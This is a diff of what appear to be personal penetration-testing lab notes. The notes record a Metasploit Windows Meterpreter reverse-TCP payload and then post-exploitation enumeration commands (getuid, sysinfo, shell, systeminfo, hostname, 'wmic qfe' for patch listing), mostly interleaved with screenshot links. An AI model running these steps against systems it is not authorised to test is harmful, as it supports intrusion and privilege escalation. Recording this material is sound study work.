@@ -53,14 +53,48 @@ set payload windows/meterpreter/reverse_tcp
 ![[Pasted image 20230530171753.png]]
 
 ![[Pasted image 20230530171849.png]]
+
 ![[Pasted image 20230530171931.png]]
 
 ```
 getuid
 
 sysinfo
-
 ```
 
 ![[Pasted image 20230530172139.png]]
+
+```
+pwd
+
+shell
+
+systeminfo
+```
+
+![[Pasted image 20230530172652.png]]
+
+![[Pasted image 20230530172758.png]]
+
+```
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+
+![[Pasted image 20230530173134.png]]
+
+```
+hostname
+
+wmic qfe
+```
+
+![[Pasted image 20230530173421.png]]
+
+*WMIC - Windows Management Instrumentation Command*
+
+*qfe - quick-fix engineering*
+
+[Win32_QuickFixEngineering class - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering?redirectedfrom=MSDN)
+
+![[Screenshot 2023-05-30 175339.png]]
 
